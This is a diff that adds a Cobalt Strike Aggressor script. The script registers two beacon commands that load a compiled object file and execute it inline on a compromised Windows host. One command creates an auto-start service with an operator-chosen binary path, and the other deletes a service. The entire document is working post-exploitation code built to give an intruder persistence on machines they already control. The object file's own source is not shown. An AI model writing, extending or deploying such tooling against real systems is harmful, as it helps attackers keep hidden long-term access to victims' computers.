@@ -1,0 +1,49 @@
+beacon_command_register("createService-Bof", "Create a Service Auto Start",
+	"Synopsis: createService-Bof <service-name> <bin path>\n");
+
+alias createService-Bof {
+    local('$service $bin $flag $barch $handle $data $args');
+    $service = $2;
+	$bin = $3;
+	$flag = "";
+    if ($service eq "" or $bin eq "") {
+		berror($1, beacon_command_detail("createService-Bof"));
+		return;
+	}
+	
+    $barch  = barch($1);
+	$handle = openf(script_resource("Service-Bof. $+ $barch $+ .obj"));
+	$data = readb($handle, -1);
+	closef($handle);
+
+	# Pack our arguments
+	btask($1, "Create Service....");
+	$args = bof_pack($1, "zzz", $service, $bin, $flag);
+	beacon_inline_execute($1, $data, "go", $args);
+}
+
+
+beacon_command_register("rmService-Bof", "Delete a Service",
+	"Synopsis: rmService-Bof <service-name>\n");
+
+alias rmService-Bof {
+    local('$service $bin $flag $barch $handle $data $args');
+    $service = $2;
+	$bin = "";
+	$flag = "deleteservice";
+    if ($service eq "") {
+		berror($1, beacon_command_detail("rmService-Bof"));
+		return;
+	}
+	
+    $barch  = barch($1);
+	$handle = openf(script_resource("Service-Bof. $+ $barch $+ .obj"));
+	$data = readb($handle, -1);
+	closef($handle);
+
+	# Pack our arguments
+	btask($1, "Delete Service....");
+	$args = bof_pack($1, "zzz", $service, $bin, $flag);
+	beacon_inline_execute($1, $data, "go", $args);
+}
+
